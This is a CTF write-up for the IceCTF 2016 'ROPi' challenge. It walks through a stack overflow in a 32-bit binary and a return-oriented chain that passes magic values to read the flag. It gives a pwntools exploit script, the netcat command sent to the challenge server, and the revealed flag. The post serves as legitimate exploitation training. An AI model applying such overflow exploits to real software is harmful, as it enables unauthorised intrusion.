Title: IceCTF 2016 - ROPi
Date: 2016-08-21 18:11
Category: CTF
Tags: icectf2016, ctf, pwn
Slug: icectf-2016-ropi
Authors: wumb0

Challenge description:
> Ritorno orientata programmazione nc ropi.vuln.icec.tf 6500

The binary provided with the challenge was an x86 ELF. I started by reversing it with radare2:
<script type="text/javascript" src="https://asciinema.org/a/0e10sx4jp4ixg0hrrgoxjk3d1.js" id="asciicast-0e10sx4jp4ixg0hrrgoxjk3d1" async></script>
Feel free to stop the video above to look at the functions!
The main function just calls ezy, which `read`s 0x40 bytes on top of a buffer that is 0x28 bytes in size. This means that we are running 0x18 bytes over the buffer. The first 4 bytes after those 0x28 overwrite the saved EBP and then the next 4 overwrite EIP. To test this theory we load up the binary in gdb and put in 0x28 bytes, plus BBBB to overwrite EBP, then iiii to overwrite EIP:

<script type="text/javascript" src="https://asciinema.org/a/cibcbemfhn7m5x5bqu131bijk.js" id="asciicast-cibcbemfhn7m5x5bqu131bijk" async></script>

Ok so we have program control. Nice! Now what? Since the program is called **ROP**i I started looking for things to jump to. I actually spent a lot of time trying to find gadgets to write an actual ROP chain. I was stumped for a bit and asked Chris Eagle for some advice because he had solved the challenge for Samurai earlier in the week. He pointed out that there are uncalled functions. If you look in the r2 video above, you can see there are three functions right after ezy in the function list (afl): `ret`, `ori`, and `pro`. After disassembling and reversing them it was clear what the intended solution was:
<script type="text/javascript" src="https://asciinema.org/a/az9litz1gxi1s7nmiq8qifqik.js" id="asciicast-az9litz1gxi1s7nmiq8qifqik" async></script>
The `ret` (0x8048569) function calls open("./flag.txt", 0), the `ori` (0x80485c4) function calls read(dati, 0x80, fd) where fd is the file descriptor opened by open previously and dati is the buffer to read to, and `pro` (0x804862c) calls printf("%s", dati). So the proper solution is to use return oriented programming to call all of these functions in order. There is one trick, however. If you look closely at `ret` and `ori` you will see that there is a condition that needs to be met in order for the functions to not hard exit. For `ret`, ebp-8 must be 0xbadbeeef and for `ori`, either ebp-8 must equal 0xabcdefff or ebp-0xc must equal 0x78563412. To start I just tried calling `ret` then `ori` so I needed to set up my buffer as follows:

[0x2c bytes padding][address of ret][address of ori][0xbadbeeef][0xabcdefff]

My attempt in gdb:
<script type="text/javascript" src="https://asciinema.org/a/2gc2jpuhs4wkzcht7l2hxg1xw.js" id="asciicast-2gc2jpuhs4wkzcht7l2hxg1xw" async></script>
It looks like `ret` and `ori` were successfully called! Since this will call `ret`, then `ori`, there is no place to put the address of `pro` to call because of the condition that needs to be meet in `ret` (0xbadbeeef). To solve this, I can actually re-use the `ezy` function to read in the buffer again. With this in mind I tried setting up my buffer as follows:

[0x2c bytes padding][address of ret][address of ezy][0xbadbeef][newline][cyclic(100)]

The reason for the cyclic pattern is to figure out at what offset I needed to overflow in ezy the second time in order to regain EIP control. This is shown below:
<script type="text/javascript" src="https://asciinema.org/a/bbe9bvl7z6cirpsk60trf28vy.js" id="asciicast-bbe9bvl7z6cirpsk60trf28vy" async></script>

Looks like I need to write 51 bytes after calling ezy again and then I can overwrite the return. So the final buffer should look as follows:

[0x2c bytes padding][address of ret][address of ezy][0xbadbeeef][newline][51 bytes of padding][address of ori][address of ezy][0xabcdefff][newline][51 bytes of padding][address of pro]

I wrote a quick pwntools script to do just this:
```python
from pwn import *
context.log_level = 'error'
e = ELF("./ropi")

print(cyclic(0x2c) + p32(e.symbols['ret']) + p32(e.symbols['ezy']) + p32(0xbadbeeef))
print(cyclic(51) + p32(e.symbols['ori']) + p32(e.symbols['ezy']) + p32(0xabcdefff))
print(cyclic(51) + p32(e.symbols['pro']))
```

```bash
python ropi.py | nc ropi.vuln.icec.tf 6500
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[+] aperto
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[+] leggi
Benvenuti al convegno RetOri Pro!
Vuole lasciare un messaggio?
[+] stampare
IceCTF{italiano_ha_portato_a_voi_da_google_tradurre}
```
Flag obtained: **IceCTF{italiano_ha_portato_a_voi_da_google_tradurre}**
